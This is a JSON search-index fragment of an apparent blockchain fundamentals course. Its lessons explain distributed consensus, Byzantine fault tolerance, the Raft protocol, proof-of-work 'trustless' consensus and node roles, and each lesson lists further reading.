networks","title":"Index"},{"location":"S01-fundamentals/M2-consensus/L2-consensus-additional/#distributed-coordination-consensus-protocols","text":"After learning about cryptography, we know how to create an identity, how to make sure no one has messed with a file, and how to capture a user's intent all in a decentralized peer-to-peer way. This is all well and good for current interactions or things we are doing now on a network, but how do we agree on things that have happened in the past? That is, how do actors in a network we coordinate and agree on the series of events that have led to the current state of the network? How do we know someone really does have digital money they can send to us and are not making it up? How do all the actors in the network then maintain that knowledge in a secure way? This is what we're going to learn in this module. To understand how all the actors in a network can coordinate and agree about the historical state of a blockchain network we will learn about consensus . Distributed consensus is not only used in blockchain, to be clear. Any internet service that needs to coordinate their servers all over the globe (which is all the major internet services) uses distributed consensus mechanisms to make that happen. Blockchain takes traditional distributed consensus one step further. We'll see what that step is once we understand the historical and fundamental principles of distributed computing. (Note: In this section, we will use the terms Distributed Computing , Distributed Systems , Distributed Consensus , and Distributed Coordination interchangeably. We'll also be speaking about consensus strictly in the computer scientific sense. Later in the course, we'll discuss consensus among people in a network, typically called governance .)","title":"Distributed Coordination: Consensus Protocols"},{"location":"S01-fundamentals/M2-consensus/L2-consensus-additional/#development-of-distributed-computing","text":"Distributed Computing became an important field of study in the 1970s when airplanes started using electronic control systems. Airline manufacturers wanted to make sure that if a certain part of the electronics gave out while the plane was in the air, the whole plane wouldn't shut down. In the scenario of an airplane, the \"bad actor\" is not a hacker trying to purposefully disable the entire airplane, but rather a single part that is not behaving as it should. As a result, researchers began researching and developing consensus protocols for the airplane computer systems. At the most basic level, \"consensus protocols are used to allow computers to work together\" and \"let different servers agree on the state of a system.\" ( Software Engineering Daily ). For the airplane manufacturers, a good consensus protocol would continue to function with some errors. This way, if one or two things failed, the entire system wouldn't fail. The ability of a consensus protocol to adapt to failure is called resilience. Crucially, early work around distributed computing and consensus protocols dealt with non-adversarial systems . This meant that any of the faults that were happening in a computer network, like an airplane, were the result of natural system errors (power failure, faulty parts, etc), not some sort of active meddling or hacking. This has now developed to encompass much more than aerospace technology. As we mentioned before, it now also covers many digital services, such as: * Any multi-party real-time communication stream (like a social media feed) * An online media streaming service which requires multiple regional servers holding and updating the exact same information on customers * A search engine service that needs to maintain and update indexed information across many regions Consensus protocols help these systems maintain historical information also called state. Broadly speaking, state can be defined as a set of variables describing a certain system at a specific time. Let\u2019s describe that in a real-world situation. Take a look around at whatever environment you\u2019re in\u2013\u2013bus station, coffee shop, office\u2013\u2013and pick out a few variables you could use to describe it. If you\u2019re inside a room, you could describe any number of things: * The number of walls * The types of furniture * The placement of furniture * The number of people * The kind of light in the room Taken all together, these variables will paint a picture of the room. And if things change (say, you turn off a light), we'll update \"The kind of light in the room\" variable, which changes the state. If multiple people needed to maintain a record about the state of our room, we'd have to find a way to communicate this state change. Consensus protocols help us do exactly that: agree on a sequential series of system state which allows all network participants adhering to the consensus protocol to have a similar understanding of the historical changes adding up to the current network state. For a distributed computer network, state typically involves technical information about critical actors in a system. For a social media site, the state includes when a user logged in, what they did, where they were, etc. For an airplane or spaceship, the state includes current status of different parts of the ship, fuel or energy levels, temperature or atmospheric data, etc. As each individual actor in the network uses the consensus protocol to propagate the changes they're doing locally and update their own state based on updates they're getting from others, a historical understanding of the system begins to emerge from these state changes. This coordination of state among multiple actors in a common system allows for many interesting systems, including many of the digital services we use today. Please note that we're using terms like \"actors\" or \"participants\" to describe the active parties in a distributed system. Despite the name, these traditionally refer to machines or computers in a network more commonly called nodes . It can be confusing but just try to remember these are general models we're discussing. Once we get into application and practice, it may be easier to understand. A distributed system where multiple actors are using a consensus protocol to maintain state can be called a state machine or finite state machine. This is fairly technical, but it simply requires us to expand our understanding of a machine, which we typically think of as a metal box containing small electronics connected by circuits. \"State machine\" allows us to consider larger systems, such as a cellphone network or all the electronic parts comprising an airplane, as themselves being machines comprised of nodes consistently maintaining a global state among themselves without a central point of failure. Along with state, distributed consensus relies on a few concepts, such as: Nodes In a strict technical sense, a node is defined as \"an electronic device that is attached to a network, and is capable of creating, receiving, or transmitting information over a communication channel.\" Distributed systems are comprised of nodes. We also call nodes participants or actors. Nodes typically fall into three categories: Leaders (nodes responsible for proposing values), Acceptors (nodes that receive values from Leader and accept them), Processors (nodes that do some operations or processing on received values) ( source ). These roles are not exclusive, a single node may take on one, two, or all three roles. Message Propagation A node can update its state in a distributed network exclusively through messages. How those messages pass or propagate through the network is a critical part of maintaining state. If a node cannot pass a message through a network, there cannot be a unified state that all network nodes agree on. How nodes in a network propagate their messages is known as its topology. Centralized systems, as shown below, can quickly distribute messages. However, they aren't particularly resilient (if the single central node collapses, so does the network). As a result, distributed systems have developed their own peer-to-peer protocols. Below is a famous diagram showing centralized, decentralized and distributed network topologies: Time The notion of time is very important in a distributed system as it creates a sort of order for the larger system. Ordering events that occur in a system is particularly important. Think about making breakfast, for example. If you mix up the order of a series of actions, like eating your eggs before you cook them, it can create chaos and confusion. Here's an article from Dean Eigenmann discussing the concept of Time, Clocks, and Order in distributed systems. Periods Related to the idea of time, every consensus protocol requires discrete periods of activity. Perhaps a node is waiting to hear from a leader, perhaps a series of transactions are being prepared for a block, perhaps the nodes are passing around the latest agreed-upon state. These periods are critical to any consensus protocol. In blockchain systems, these periods typically revolve around the creation and propagation of transactions in a block. Fault Tolerance This is a formal description of resilience: How many mistakes can a system tolerate before it will collapse completely? Put another way, how many bad nodes can we have in a system before the system ceases to propagate state? Leslie Lamport proposed a subset of fault tolerance called Byzantine Fault Tolerance. We discussed it briefly in the video before. Essentially, the most amount of fault a distributed network can absorb is one-third. So, if 2/3rds of a system are still available and coordinating, the system can still run. Because of this famous thought experiment, you may see fault tolerance referred to as Byzantine Fault tolerance or Practical Byzantine Fault Tolerance. However, it's similar to how a rectangle is not a square but a square is a rectangle: Not all fault tolerance is Byzantine fault tolerance. We'll discuss more of this later in the section on trustless consensus. Please note: Distributed consensus outside of blockchain only deals with systems that are non-adversarial meaning all the nodes trust each other. This means the only errors that would show up would be from things like power failures or misbehaving parts, etc. You would not attribute malice to any misbehaving actor. Blockchain's big innovation, which we'll discuss later, was the creation of consensus protocols in adversarial networks in which you must assume everyone is out to get you. This is what we call trustless consensus .","title":"Development of Distributed Computing"},{"location":"S01-fundamentals/M2-consensus/L2-consensus-additional/#conclusion","text":"In our search for the primitives underlying blockchain technology, consensus holds an important piece by allowing a network to have a memory of its own history, which we are calling state. We saw how cryptography allowed us to ensure peer-to-peer authenticity in the moment. Consensus protocols allow us to \"save\" that authenticity across time by facilitating the coordination of all network nodes around a global state. It also allows new participants (nodes) to enter the system and get \"up to date\" on what has happened previously in the system. The next section is an excellent overview of a basic consensus protocol system called Raft. Raft is a simplified consensus algorithm which we feel makes it more approachable to understand. However, Raft is a production-ready consensus protocol used by such major projects as MongoDB. The website The Secret Lives of Data has created an extraordinary walkthrough of Raft, which we hope will illustrate consensus in a concrete way.","title":"Conclusion"},{"location":"S01-fundamentals/M2-consensus/L2-consensus-additional/#additional-links","text":"","title":"Additional Links"},{"location":"S01-fundamentals/M2-consensus/L2-consensus-additional/#basic","text":"Interactive: Raft: Understandable Distributed Consensus A really excellent, interactive walkthrough of the Raft consensus protocol, a basic consensus protocol. The simple and easy way in which the tutorial walks through the consensus mechanism will help you understand how consensus protocols work on a practical level. Article: Let's Take a Crack at Understanding Distributed Consensus (Preethi Kasireddy) Article Series: Distributed Systems Digest (Dean Eigenmann) This is an excellent series of articles discussing distributed systems, in an approachable way. If you click \"Let me read it first,\" you can access the articles. Podcast: Distributed Systems with Ethan Buchman (Software Engineering Daily) An overview on distributed systems, including the history of their development Article: Want to Really Understand Blockchain? You Need to Understand State (ConsenSys) Article: A Brief Overview of Kademlia and Its Use In Various Decentralized Platforms The Kademlia protocol is a peer-to-peer file sharing system used by many decentralized systems, including Ethereum. Article: Nodes and Links (Explained from First Principles) Interactive Code: BitTorrent Simulator A very cool visualization of how files are distributed over BitTorrent, which uses peer-to-peer file sharing Wikipedia: Consensus Methods, Distributed Computing, Network Resilience, Fault Tolerance, Network State, Byzantine Fault Tolerance State Machines, Peer-to-Peer Protocols, Gossip Protocol","title":"Basic"},{"location":"S01-fundamentals/M2-consensus/L2-consensus-additional/#advanced","text":"Course: Distributed Systems Textbook: Foundations of Distributed Consensus and Blockchains (Elaine Shi) An advanced and extremely technical but comprehensive view on distributed consensus as it pertains to blockchain development. Academic Article: Leslie Lamport's Byzantine Generals Problem Article: Times, Clocks and Ordering (Leslie Lamport) GitHub: Notes for Dean Eigenmann's Article \"Times, Clocks and Ordering\" GitHub: P2P Workshops This site has a series of exercises to learn about building P2P networks","title":"Advanced"},{"location":"S01-fundamentals/M2-consensus/L3-raft/","text":"Raft Consensus Tutorial Please go to the Secret Lives of Data website to learn about the basic mechanics of the Raft consensus protocol. While Raft is a production-ready consensus protocol, we are mainly using it here to show you a concrete example of a distributed system maintaining state across different nodes in a network. Please note, Raft is not a Byzantine fault tolerant consensus protocol. Instead, Raft is a leader-led consensus protocol, meaning all the nodes blindly trust whatever state the leader sends to them. However, in Raft, if the leader fails in some way and stops sending state, the other nodes in the network are able to identify the failure and re-elect another leader in a distributed way. In this way, the Raft consensus mechanism shows how a distributed system can replicate state in a resilient way. Even if you never see it or use it again, we hope learning about Raft will give you a better sense of how a distributed system can use a consensus protocol to adapt to node failures. Additional Resources Wikipedia: Raft Article: In Search of an Understandable Consensus Algorithm The Raft consensus protocol was developed as a simpler alternative to the Paxos consensus algorithm developed by Leslie Lamport.","title":"Index"},{"location":"S01-fundamentals/M2-consensus/L3-raft/#raft-consensus-tutorial","text":"Please go to the Secret Lives of Data website to learn about the basic mechanics of the Raft consensus protocol. While Raft is a production-ready consensus protocol, we are mainly using it here to show you a concrete example of a distributed system maintaining state across different nodes in a network. Please note, Raft is not a Byzantine fault tolerant consensus protocol. Instead, Raft is a leader-led consensus protocol, meaning all the nodes blindly trust whatever state the leader sends to them. However, in Raft, if the leader fails in some way and stops sending state, the other nodes in the network are able to identify the failure and re-elect another leader in a distributed way. In this way, the Raft consensus mechanism shows how a distributed system can replicate state in a resilient way. Even if you never see it or use it again, we hope learning about Raft will give you a better sense of how a distributed system can use a consensus protocol to adapt to node failures.","title":"Raft Consensus Tutorial"},{"location":"S01-fundamentals/M2-consensus/L3-raft/#additional-resources","text":"Wikipedia: Raft Article: In Search of an Understandable Consensus Algorithm The Raft consensus protocol was developed as a simpler alternative to the Paxos consensus algorithm developed by Leslie Lamport.","title":"Additional Resources"},{"location":"S01-fundamentals/M2-consensus/L4-nodes-and-networks/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M2-consensus/L4-nodes-and-networks/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S01-fundamentals/M2-consensus/L5-trustless-consensus/","text":"Trustless Consensus Note: this section is fairly text heavy and may be difficult to understand at first. Not to worry! The two videos following this section cover similar material in a visual way. We'll also discuss this in our Office Hours or on Discord. We've spent the past few sections learning about how consensus protocols work to make peer-to-peer distributed systems maintain state across time despite node failure. This is a general computer science concept that's used in building distributed networks that may be susceptible to machine failures, message duplications, message corruptions, etc. Since they are decentralized networks, public blockchains have to deal with this category of problems. But, they are also presented with an entirely new set of issues. Public blockchains introduce a specific challenge to agreeing on a state. In a non-blockchain distributed network, state is a set of data valuable really only to the private organization running the network. For example, in a digital streaming service, the state might contain where a user stopped watching a previous video. That way, if they start the video again and are served the content from a different network server, their place will be saved. The state of a public blockchain network, on the other hand, is the public, distributed ledger which contains the financial balances of everyone in the network. This has enormous value to many different organizations and individuals. In a way, everyone is incentivized to lie about the state of the network because it's directly tied to their net worth. Imagine if when you went to the bank, rather than a bank teller telling you your balance, they asked you for your balance. Most people would, at some point, be very tempted to lie and make up a number (Probably a very large number). This is the main element that distinguishes public blockchain networks from traditional distributed networks. The network state of a blockchain is one that contains economic value directly impacting the actors in the network. But, as we've seen studying traditional distributed systems, the blockchain network still needs those nodes (which have competing interests) to update and propagate the state. Enter trustless consensus: Bitcoin solves this issue by creating a consensus mechanism which can operate in an adversarial environment where the nodes have competing interests. Rather than assuming the state they are propagating is correct, Bitcoin's trustless consensus allows each individual node to verify the state themselves using cryptography. We'll walk through how Bitcoin and other proof of work blockchain networks achieve this feat by describing the underlying assumptions and the solutions. Quick aside: What about current traditional banks? Don't they have distributed networks that contain economic value among nodes (customers) with competing interests? Why don't we consider them as solving this issue? Yes, this is true that global financial companies or governments have built distributed networks that have similar conditions to what public blockchains are hoping to achieve. However, these traditional networks separate trust from distributed consensus in their networks. You can imagine it like a castle, with powerful fortifications, that contains a ledger containing all the assets in the kingdom. If you can breach the defenses and get into the castle, you'll have control over that ledger. Blockchain's theoretical innovation is baking the defense into the consensus mechanisms themselves so there are many different castles and, if one falls, it may temporarily impact the network but will not collapse the system. In fact, because blockchains are removing trusted intermediaries (like a bank) the only way to make their network state secure is to assume that everyone is lying. With your trust assumptions low (assuming everyone is lying), you're protected against that behavior. How do you create a consensus protocol in these dire circumstances? Well, this is the incredible innovation that blockchains, beginning with Bitcoin, created. It not only built the ecosystem of blockchain networks we see in today's world, but it even solved a general distributed computing problem in the process. Double Spend and Byzantine Generals Solution The biggest issue facing digital money is what is called the \"double spend\" problem: Since digital files can be copied endlessly, how can you be sure whatever digital money you're paid with has not been previously spent? This is the critical issue Satoshi Nakamoto set out to solve in the Bitcoin whitepaper : We propose a solution to the double-spending problem using a peer-to-peer network. The network timestamps transactions by hashing them into an ongoing chain of hash-based proof-of-work, forming a record that cannot be changed without redoing the proof-of-work. The longest chain not only serves as proof of the sequence of events witnessed, but proof that it came from the largest pool of CPU power. As long as a majority of CPU power is controlled by nodes that are not cooperating to attack the network, they'll generate the longest chain and outpace attackers. The network itself requires minimal structure. Messages are broadcast on a best effort basis, and nodes can leave and rejoin the network at will, accepting the longest proof-of-work chain as proof of what happened while they were gone. Nakamoto Consensus, also called Proof of Work consensus, creates a consensus mechanism for a digital money system where each individual node does not have to blindly accept the network state. Elements of Proof of Work Consensus In discussing the elements comprising Proof of Work consensus, we'll pull from concepts we mentioned previously in our discussion of traditionally distributed networks. Specifically, you'll need to remember the concept of messages , the concept of nodes and the roles they play as well as the concept of time and periods in distributed systems. Messages In Proof of Work consensus, the fundamental message is a transaction, constructed using the public key cryptography and digital signatures primitives we discussed previously, \"trustlessly\" (cryptographically) ensuring the identity and integrity of the message. Transactions in Proof of Work consensus are atomic, meaning the network either accepts or rejects the transaction, there is no in-between or halfway. If the network accepts the transaction, the network state then advances to incorporate the effects of the transaction. For example, let's say an imaginary public ledger at State-0 says Alejandro has 1 token and Barbarella has 0 tokens . Alejandro then submits a transaction to the network saying he would like to pay Barbarella 0.5 tokens . The network accepts the transaction, which creates a new state, State-1 in which the public ledger has been updated to show Alejandro now has 0.5 tokens and Barbarella has 0.5 tokens . Nodes and their Roles In Proof of Work consensus, here are the roles nodes play: - Miners These are the nodes which are certifying which transactions are valid by including them in blocks and receiving the block reward. When a miner creates a valid block and propagates it throughout the network, the network state is advanced in a trustless way. (We'll examine in a moment how a miner can create a block in a trustless way.) - Full Nodes These are the general network nodes which are creating transactions and passing along transactions created by other nodes in the network. They are also maintaining full network state when they receive valid blocks from Miner nodes. Each full node in the network checks the work of a block to ensure its validity. - Light Nodes These are network nodes which are simply submitting transactions to the network and waiting for them to be accepted by the network. They do not participate in the process of checking the validity of the advancing network state and do not pass along messages. - Archive Nodes Similar to a full node, it maintains and provides the current state, but also maintains and provides historical states. e.g. balance at x date. Remember from the section on public key cryptography that nodes identify themselves in the network by using the peer-to-peer identity mechanism of public key cryptography. Periods and Proof of Work In Proof of Work consensus, there are two distinct periods in a network: * Period of Block Production This is the period in which Miner nodes validate transactions by bundling them all together and competing to produce a valid Proof of Work algorithm. It begins when the miner receives the latest valid block and stops when the miner solves their Proof of Work algorithm or receives a valid block from another miner. * Period of Block Propagation This is the period in which a valid block gradually moves through the network. A full node or miner node will only propagate blocks that are valid, so the process of the network accepting a valid block (and accepted the new network state) is an emergent one. The following section will describe the process of creating a block and how blocks chained together create an immutable ledger that all network participants can validate on their own. This individual validation, without having to rely on trust, is how proof of work consensus maintains state in a distributed and safe way. Additional Materials Introduction Video & Interactive Code: ETH.Build with Byzantine Generals' Problem Austin Griffith walks through a hands-on implementation of the Byzantine Generals' Problem with his amazing ETH.Build platform Article: What is the Byzantine Generals Problem? Interactive Code: Anders Blockchain A great, web-based interactive tutorial going over fundamentals of Proof of Work consensus including block production through hashing and distributed blockchains Article: How Satoshi Nakamoto Solved the Byzantine Generals Problem Wikipedia: Directed Acyclic Graphs Because each new block embeds the hash of the previous valid block, this creates a computer science data structure known as Directed Acyclic Graphs (similar to the way Git software works!).](https://ethereum.org/en/developers/docs/nodes-and-clients/#) Advanced Code: Implementing Proof of Work A continuation of the series from Kyle Simpson Code: Implementing Mining Protocol A continuation of the series from Kyle Simpson","title":"Index"},{"location":"S01-fundamentals/M2-consensus/L5-trustless-consensus/#trustless-consensus","text":"Note: this section is fairly text heavy and may be difficult to understand at first. Not to worry! The two videos following this section cover similar material in a visual way. We'll also discuss this in our Office Hours or on Discord. We've spent the past few sections learning about how consensus protocols work to make peer-to-peer distributed systems maintain state across time despite node failure. This is a general computer science concept that's used in building distributed networks that may be susceptible to machine failures, message duplications, message corruptions, etc. Since they are decentralized networks, public blockchains have to deal with this category of problems. But, they are also presented with an entirely new set of issues. Public blockchains introduce a specific challenge to agreeing on a state. In a non-blockchain distributed network, state is a set of data valuable really only to the private organization running the network. For example, in a digital streaming service, the state might contain where a user stopped watching a previous video. That way, if they start the video again and are served the content from a different network server, their place will be saved. The state of a public blockchain network, on the other hand, is the public, distributed ledger which contains the financial balances of everyone in the network. This has enormous value to many different organizations and individuals. In a way, everyone is incentivized to lie about the state of the network because it's directly tied to their net worth. Imagine if when you went to the bank, rather than a bank teller telling you your balance, they asked you for your balance. Most people would, at some point, be very tempted to lie and make up a number (Probably a very large number). This is the main element that distinguishes public blockchain networks from traditional distributed networks. The network state of a blockchain is one that contains economic value directly impacting the actors in the network. But, as we've seen studying traditional distributed systems, the blockchain network still needs those nodes (which have competing interests) to update and propagate the state. Enter trustless consensus: Bitcoin solves this issue by creating a consensus mechanism which can operate in an adversarial environment where the nodes have competing interests. Rather than assuming the state they are propagating is correct, Bitcoin's trustless consensus allows each individual node to verify the state themselves using cryptography. We'll walk through how Bitcoin and other proof of work blockchain networks achieve this feat by describing the underlying assumptions and the solutions. Quick aside: What about current traditional banks? Don't they have distributed networks that contain economic value among nodes (customers) with competing interests? Why don't we consider them as solving this issue? Yes, this is true that global financial companies or governments have built distributed networks that have similar conditions to what public blockchains are hoping to achieve. However, these traditional networks separate trust from distributed consensus in their networks. You can imagine it like a castle, with powerful fortifications, that contains a ledger containing all the assets in the kingdom. If you can breach the defenses and get into the castle, you'll have control over that ledger. Blockchain's theoretical innovation is baking the defense into the consensus mechanisms themselves so there are many different castles and, if one falls, it may temporarily impact the network but will not collapse the system. In fact, because blockchains are removing trusted intermediaries (like a bank) the only way to make their network state secure is to assume that everyone is lying. With your trust assumptions low (assuming everyone is lying), you're protected against that behavior. How do you create a consensus protocol in these dire circumstances? Well, this is the incredible innovation that blockchains, beginning with Bitcoin, created. It not only built the ecosystem of blockchain networks we see in today's world, but it even solved a general distributed computing problem in the process.","title":"Trustless Consensus"},{"location":"S01-fundamentals/M2-consensus/L5-trustless-consensus/#double-spend-and-byzantine-generals-solution","text":"The biggest issue facing digital money is what is called the \"double spend\" problem: Since digital files can be copied endlessly, how can you be sure whatever digital money you're paid with has not been previously spent? This is the critical issue Satoshi Nakamoto set out to solve in the Bitcoin whitepaper : We propose a solution to the double-spending problem using a peer-to-peer network. The network timestamps transactions by hashing them into an ongoing chain of hash-based proof-of-work, forming a record that cannot be changed without redoing the proof-of-work. The longest chain not only serves as proof of the sequence of events witnessed, but proof that it came from the largest pool of CPU power. As long as a majority of CPU power is controlled by nodes that are not cooperating to attack the network, they'll generate the longest chain and outpace attackers. The network itself requires minimal structure. Messages are broadcast on a best effort basis, and nodes can leave and rejoin the network at will, accepting the longest proof-of-work chain as proof of what happened while they were gone. Nakamoto Consensus, also called Proof of Work consensus, creates a consensus mechanism for a digital money system where each individual node does not have to blindly accept the network state.","title":"Double Spend and Byzantine Generals Solution"},{"location":"S01-fundamentals/M2-consensus/L5-trustless-consensus/#elements-of-proof-of-work-consensus","text":"In discussing the elements comprising Proof of Work consensus, we'll pull from concepts we mentioned previously in our discussion of traditionally distributed networks. Specifically, you'll need to remember the concept of messages , the concept of nodes and the roles they play as well as the concept of time and periods in distributed systems.","title":"Elements of Proof of Work Consensus"},{"location":"S01-fundamentals/M2-consensus/L5-trustless-consensus/#messages","text":"In Proof of Work consensus, the fundamental message is a transaction, constructed using the public key cryptography and digital signatures primitives we discussed previously, \"trustlessly\" (cryptographically) ensuring the identity and integrity of the message. Transactions in Proof of Work consensus are atomic, meaning the network either accepts or rejects the transaction, there is no in-between or halfway. If the network accepts the transaction, the network state then advances to incorporate the effects of the transaction. For example, let's say an imaginary public ledger at State-0 says Alejandro has 1 token and Barbarella has 0 tokens . Alejandro then submits a transaction to the network saying he would like to pay Barbarella 0.5 tokens . The network accepts the transaction, which creates a new state, State-1 in which the public ledger has been updated to show Alejandro now has 0.5 tokens and Barbarella has 0.5 tokens .","title":"Messages"},{"location":"S01-fundamentals/M2-consensus/L5-trustless-consensus/#nodes-and-their-roles","text":"In Proof of Work consensus, here are the roles nodes play: - Miners These are the nodes which are certifying which transactions are valid by including them in blocks and receiving the block reward. When a miner creates a valid block and propagates it throughout the network, the network state is advanced in a trustless way. (We'll examine in a moment how a miner can create a block in a trustless way.) - Full Nodes These are the general network nodes which are creating transactions and passing along transactions created by other nodes in the network. They are also maintaining full network state when they receive valid blocks from Miner nodes. Each full node in the network checks the work of a block to ensure its validity. - Light Nodes These are network nodes which are simply submitting transactions to the network and waiting for them to be accepted by the network. They do not participate in the process of checking the validity of the advancing network state and do not pass along messages. - Archive Nodes Similar to a full node, it maintains and provides the current state, but also maintains and provides historical states. e.g. balance at x date. Remember from the section on public key cryptography that nodes identify themselves in the network by using the peer-to-peer identity mechanism of public key cryptography.","title":"Nodes and their Roles"},{"location":"S01-fundamentals/M2-consensus/L5-trustless-consensus/#periods-and-proof-of-work","text":"In Proof of Work consensus, there are two distinct periods in a network: * Period of Block Production This is the period in which Miner nodes validate transactions by bundling them all together and competing to produce a valid Proof of Work algorithm. It begins when the miner receives the latest valid block and stops when the miner solves their Proof of Work algorithm or receives a valid block from another miner. * Period of Block Propagation This is the period in which a valid block gradually moves through the network. A full node or miner node will only propagate blocks that are valid, so the process of the network accepting a valid block (and accepted the new network state) is an emergent one. The following section will describe the process of creating a block and how blocks chained together create an immutable ledger that all network participants can validate on their own. This individual validation, without having to rely on trust, is how proof of work consensus maintains state in a distributed and safe way.","title":"Periods and Proof of Work"},{"location":"S01-fundamentals/M2-consensus/L5-trustless-consensus/#additional-materials","text":"","title":"Additional Materials"},{"location":"S01-fundamentals/M2-consensus/L5-trustless-consensus/#introduction","text":"Video & Interactive Code: ETH.Build with Byzantine Generals' Problem Austin Griffith walks through a hands-on implementation of the Byzantine Generals' Problem with his amazing ETH.Build platform Article: What is the Byzantine Generals Problem? Interactive Code: Anders Blockchain A great, web-based interactive tutorial going over fundamentals of Proof of Work consensus including block production through hashing and distributed blockchains Article: How Satoshi Nakamoto Solved the Byzantine Generals Problem Wikipedia: Directed Acyclic Graphs Because each new block embeds the hash of the previous valid block, this creates a computer science data structure known as Directed Acyclic Graphs (similar to the way Git software works!).](https://ethereum.org/en/developers/docs/nodes-and-clients/#)","title":"Introduction"},{"location":"S01-fundamentals/M2-consensus/L5-trustless-consensus/#advanced","text":"Code: Implementing Proof of Work A continuation of the series from Kyle Simpson Code: Implementing Mining Protocol A continuation of the series from Kyle Simpson","title":"Advanced"},{"location":"S01-fundamentals/M2-consensus/L6-what-is-a-block/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M2-consensus/L6-what-is-a-block/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S01-fundamentals/M2-consensus/L7-chain-of-blocks/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M2-consensus/L7-chain-of-blocks/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S01-fundamentals/M2-consensus/L8-pow-in-ethereum/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M2-consensus/L8-pow-in-ethereum/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S01-fundamentals/M2-consensus/L9-blockchain-fork/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M2-consensus/L9-blockchain-fork/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S01-fundamentals/M3-ag-blockchain/L1-mental-model/","text":"Mental Model for Basic Blockchain Architecture Let's take a look at this diagram of a blockchain node, which is not specific to any particular cryptocurrency and could be on any blockchain network: Above the dotted line is the distributed, peer-to-peer network with which the node is interacting. As we mentioned previously, the fundamental unit of communication is the transaction, (commonly shortened to txn ), which the node is both sending and receiving from the network. Below the line are all the primitives we have discussed in this section. We have the cryptographic primitives used in the network identity, and those used to validate transactions. We also have the consensus protocol, which is agreed upon by the network, and which the node will use to check the validity of the blocks. If the block is valid, the node will update its network state with the changes the valid transactions make. If this node is a miner, the consensus mechanism will also work to produce a valid block. Let's now zoom out and see a simplified version of the larger network: The nodes have a different color to show they have unique identities, which are created by the cryptographic keys they use in their network identity. While the nodes have different identities, please note that they all have the same \"Consensus Protocol.\" This is the mechanism they have all agreed to use to maintain and update their network state. However, it's only successful if everyone is using it and coming to agreement about the network state. Luckily, this network we are looking at is all in agreement about its state. Please notice the middle of the diagram, the Emergent Properties . It's easy to forget that the network state and the network consensus are not a set, static property. Instead, they are a constantly evolving and mutating entity that changes with each transaction that is confirmed by the consensus protocol then propagated to the rest of the network. In our everyday life, we're more likely to encounter centralized entities attesting to a state. Your bank tells you your balance is a certain number, etc. With distributed networks, the network state is not something that's dictated by one centralized force. Instead, it's something that emerges from all the networks of participants, sometimes numbering in the millions, passing transactions, valid blocks and gradually shifting from one network state to the next. In the next section, we'll talk about how some network configurations change and why. But don't forget that, for every blockchain network, there is a generalizable structure you can isolate and use to identify what's different or the same. This will help you discern what networks are good for what purpose, how stable a network may be, or what improvements or innovations will change which part of a network. Additional Material Interactive Code: Building a Blockchain (Josh Crites, ConsenSys Academy) We created an interactive notebook where you can deepen your understanding and experiment to see how their properties are essential for building blockchains Interactive Code: Anders Blockchain A great, web-based interactive tutorial going over fundamentals of Proof of Work consensus including block production through hashing and distributed blockchains Code Tutorial: Build Your Own Blockchain Andrej Karpathy, who's done some great machine learning tutorials, built this tutorial walking through building the Bitcoin network using Python.","title":"Index"},{"location":"S01-fundamentals/M3-ag-blockchain/L1-mental-model/#mental-model-for-basic-blockchain-architecture","text":"Let's take a look at this diagram of a blockchain node, which is not specific to any particular cryptocurrency and could be on any blockchain network: Above the dotted line is the distributed, peer-to-peer network with which the node is interacting. As we mentioned previously, the fundamental unit of communication is the transaction, (commonly shortened to txn ), which the node is both sending and receiving from the network. Below the line are all the primitives we have discussed in this section. We have the cryptographic primitives used in the network identity, and those used to validate transactions. We also have the consensus protocol, which is agreed upon by the network, and which the node will use to check the validity of the blocks. If the block is valid, the node will update its network state with the changes the valid transactions make. If this node is a miner, the consensus mechanism will also work to produce a valid block. Let's now zoom out and see a simplified version of the larger network: The nodes have a different color to show they have unique identities, which are created by the cryptographic keys they use in their network identity. While the nodes have different identities, please note that they all have the same \"Consensus Protocol.\" This is the mechanism they have all agreed to use to maintain and update their network state. However, it's only successful if everyone is using it and coming to agreement about the network state. Luckily, this network we are looking at is all in agreement about its state. Please notice the middle of the diagram, the Emergent Properties . It's easy to forget that the network state and the network consensus are not a set, static property. Instead, they are a constantly evolving and mutating entity that changes with each transaction that is confirmed by the consensus protocol then propagated to the rest of the network. In our everyday life, we're more likely to encounter centralized entities attesting to a state. Your bank tells you your balance is a certain number, etc. With distributed networks, the network state is not something that's dictated by one centralized force. Instead, it's something that emerges from all the networks of participants, sometimes numbering in the millions, passing transactions, valid blocks and gradually shifting from one network state to the next. In the next section, we'll talk about how some network configurations change and why. But don't forget that, for every blockchain network, there is a generalizable structure you can isolate and use to identify what's different or the same. This will help you discern what networks are good for what purpose, how stable a network may be, or what improvements or innovations will change which part of a network.","title":"Mental Model for Basic Blockchain Architecture"},{"location":"S01-fundamentals/M3-ag-blockchain/L1-mental-model/#additional-material","text":"Interactive Code: Building a Blockchain (Josh Crites, ConsenSys Academy) We created an interactive notebook where you can deepen your understanding and experiment to see how their properties are essential for building blockchains Interactive Code: Anders Blockchain A great, web-based interactive tutorial going over fundamentals of Proof of Work consensus including block production through hashing and distributed blockchains Code Tutorial: Build Your Own Blockchain Andrej Karpathy, who's done some great machine learning tutorials, built this tutorial walking through building the Bitcoin network using Python.","title":"Additional Material"},{"location":"S01-fundamentals/M3-ag-blockchain/L2-configurations/","text":"Configurations for Different Blockchain Networks Now that we have a general model of a blockchain, when we encounter a new network, we know which questions to ask. Some suggested parts of the model you could build on: Nodes and Roles What are the different roles in the network for nodes? What are the ways the nodes join the network and acquire their different roles? Consensus Mechanism Always good to know for a blockchain network, will typically let you know whether a network is public, private or consortium. It typically also lets you know the processing limit for the network. The lower the trust assumptions, usually the more limited the processing limit (To be clear, not always the case). 